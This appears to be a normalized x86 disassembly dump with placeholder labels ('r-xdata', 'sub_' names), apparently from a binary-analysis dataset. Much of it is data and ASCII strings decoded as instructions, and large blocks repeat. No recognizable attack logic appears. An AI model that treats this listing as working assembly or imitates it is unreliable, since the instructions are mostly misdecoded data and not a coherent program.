add [ gs : eax ] dl
xor eax [ esp + eax * 4 - 0x53 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
les esi [ fs : ebx + eax * 2 + 0x6100 ]
add [ eax + 0x3 ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ecx ] ah
add bh bh
sbb bh dh
inc ebx
add [ edi + esi * 8 + 0x43 ] dh
insb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
add [ 0x44 ] 0x0
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
add al 0x78
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
js r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov esp 0x68004216
add [ eax ] al
inc ebx
jne r-xdata
inc ebx
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
add dh bh
call sub_43863a
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
popad
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jae r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsd
outsb
je r-xdata
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x24ff0001 ] ah
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov ah 0x43
sub_433c1f
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f090025 ] al
outsb
js r-xdata
dec ebx
jns r-xdata
dec esp
mov eax 0x1180043
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
jns r-xdata
jb r-xdata
add [ eax ] al
and [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
mov eax 0xe80043
add bh bh
call 0x2423c69
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
loopne r-xdata
jns r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
push ebp
push ebp
jo r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060028 ] al
outsb
inc ebp
js r-xdata
jns r-xdata
jo r-xdata
inc esp
jns r-xdata
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
add [ eax ] al
inc eax
inc ebx
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
add [ eax ] al
add [ eax ] al
add ah al
aas
je r-xdata
push ebx
je r-xdata
dec edi
outsb
sub [ esi + 0xe00043 ] dh
add bh bh
add [ eax ] al
jmp eax
add al 0xb7
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
jb r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
inc esp
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax ] dl
jb r-xdata
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
and [ esp + eax * 2 ] 0x0
xchg esp eax
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
add ah ch
inc esp
add [ eax ] al
adc al 0x36
adc al 0x2
inc esp
jb r-xdata
inc ebx
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
add [ esi + esi ] dl
je r-xdata
add [ eax ] eax
jo r-xdata
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
jmp r-xdata
add [ edi + 0x79480044 ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ edx ] al
inc eax
add [ edx ] al
push 0x78004203
ja r-xdata
insb
jae r-xdata
inc eax
add al dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc ebx
add dl ch
aas
inc ebx
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ edi ]
pop esp
inc ebx
add [ ebx ] al
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x3e ] bl
inc ebx
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
inc ebx
add al ch
add [ eax ] al
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec edx
push [ ecx + edi * 2 + 0x43 ]
push 0x426b6365
outsd
js r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + edi * 2 + 0x43 ] ah
add [ eax + edi * 2 + 0x78100043 ] al
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
je r-xdata
outsd
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
je r-xdata
add [ edx + edi * 2 ] ch
inc ebx
add [ eax + 0x78 ] dl
inc ebx
add ah ah
ja r-xdata
inc esp
add ah ch
js r-xdata
rol [ eax ] 0x40
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] ch
inc ebx
add [ eax ] bl
add [ eax - 0x6fffbc87 ] cl
jns r-xdata
inc ebx
jbe r-xdata
cld
insb
jae r-xdata
add bh bh
sbb [ esi + 0x44 ] ch
add [ edi ] cl
push esp
inc ebx
jne r-xdata
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah bh
sub [ eax + eax - 0x4 ] eax
add [ esp + edi * 8 + 0x34a80041 ] bl
inc eax
add [ edi + eax * 2 ] ah
outsd
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x78004203
ja r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x6e18ff00 ] ah
inc esp
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ eax ]
outsb
inc eax
inc ebx
add [ eax ] al
add al [ eax ]
add [ esi + edi + 0x3480043 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x18004341
je r-xdata
push esp
inc ebx
jne r-xdata
inc ebx
add [ edi + esi + 0x43 ] bl
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
mov eax eax
js r-xdata
add [ edi + 0x79480044 ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
inc esp
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax ] dl
jb r-xdata
add [ eax ] al
insd
inc ebx
xor al 0x40
je r-xdata
outsd
outsb
fdiv [ edi + 0x41 ]
add [ eax ] dl
add al [ eax ]
push [ eax + 0x78 ]
inc ebx
inc ebx
add [ eax + 0x3c00418d ] dl
add [ eax ] al
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + edi * 2 + 0x43 ] ah
add [ eax + edi * 2 + 0x78100043 ] al
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
outsd
insb
jb r-xdata
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add ah ch
js r-xdata
cwde
inc esp
add [ eax + 0x1800446a ] bh
inc eax
inc ebx
add ah bh
aas
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ ebp + eax + 0x4580044 ] ch
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
sar [ eax + 0x41 ] 0x43
insd
inc esp
add [ eax + 0x6d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050015 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
push cs
add [ ebx ] cl
inc ecx
insb
insb
outsd
ja r-xdata
inc ebx
je r-xdata
add [ gs : eax ] dl
xor eax [ esp + eax * 4 - 0x53 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
les esi [ fs : ebx + eax * 2 + 0x6100 ]
add [ eax + 0x3 ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ecx ] ah
add bh bh
sbb bh dh
inc ebx
add [ edi + esi * 8 + 0x43 ] dh
insb
jae r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
add [ 0x44 ] 0x0
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
outsd
insb
outsd
jb r-xdata
add al 0x78
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
js r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov esp 0x68004216
add [ eax ] al
inc ebx
jne r-xdata
inc ebx
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
add dh bh
call sub_43863a
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
popad
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jae r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jb r-xdata
outsd
outsb
je r-xdata
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x24ff0001 ] ah
outsb
cwde
mov bl 0x43
add [ ebp ] bl
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
mov ah 0x43
sub_434560
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070026 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002a ] al
outsb
js r-xdata
dec ebx
jns r-xdata
dec esp
mov eax 0x1180043
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
mov bh 0x43
add al bl
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
jns r-xdata
jb r-xdata
add [ eax ] al
sub [ eax ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
mov eax 0xe80043
add bh bh
call 0x24245aa
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
jb r-xdata
loopne r-xdata
jns r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc esp
jb r-xdata
dec eax
inc ebx
add [ edx + eax ] dl
add [ eax ] al
adc al 0x36
inc ebx
add [ eax + 0x3 ] cl
push ebp
jo r-xdata
arpl [ ebx + 0x74 ] bp
mov eax 0x1100043
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0b00
inc esp
outsd
ja r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002f ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edx ] cl
dec edi
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
outsb
inc ebp
js r-xdata
jns r-xdata
jo r-xdata
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
mov edx 0x1000043
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al 0x0
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
and [ esp + eax * 2 ] 0x0
xchg esp eax
jb r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
push ebx
je r-xdata
dec edi
outsb
sub [ esi + 0xe00043 ] dh
add bh bh
add [ eax ] al
jmp eax
add al 0xb7
inc ebx
add al ch
add [ eax ] eax
jns r-xdata
je r-xdata
jb r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
inc esp
jb r-xdata
outsd
inc edx
jne r-xdata
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ edx + edi * 2 + 0x7ba00043 ] bl
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xb0ff
inc esp
add [ ebx + esi * 2 ] dl
inc ebx
add [ eax ] dl
jb r-xdata
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
inc eax
add [ esp + edi * 8 + 0x34a80041 ] bl
inc eax
add [ edi + eax * 2 ] ah
jb r-xdata
add [ edx ] al
inc eax
add [ edx ] al
push 0x3c004203
jpe r-xdata
inc esp
jb r-xdata
add [ eax ] eax
jo r-xdata
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ 0x6e410700 ] cl
je r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ eax ] bl
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ esp + edi * 2 ] ch
inc ebx
add [ edi + 0x7c840044 ] dh
inc ebx
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add ah bh
sub [ eax + eax - 0x4 ] eax
jbe r-xdata
inc esp
outsd
lea eax [ bx + si ]
call sub_438ae8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
dec eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2dffbcb8 ] bh
inc ebx
add al ch
add [ eax ] al
jns r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ 0x44 ] 0x0
add [ 0x11ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add al 0x78
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
add eax [ eax ]
add [ eax ] al
outsb
call 0x5c438c3e
aaa
inc ebx
add [ 0x74530800 ] dh
inc ebx
je r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebx
mov ch 0x43
add [ eax + eax ] dh
[ eax + 0x1004428 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add dh bh
call sub_438d83
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov ah 0x43
add ah al
add eax [ eax + eax - 0xc ]
add eax [ eax + eax - 0x40 ]
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
push [ eax ]
insb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
insd
inc esp
add [ eax + 0x6d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
or eax 0x6e410700
sar [ edx + 0x43 ] 0x1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
les esi [ ebx + eax * 2 + 0x6100 ]
[ eax ]
test [ ebx ] sub_43f7b4
add [ eax ] al
add [ eax + 0x3 ] al
add [ eax + 0x3c00418d ] dl
add [ eax ] al
push eax
popad
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x24ff0001 ] ah
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ gs : eax ] dl
xor eax [ esp + eax * 4 - 0x53 ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
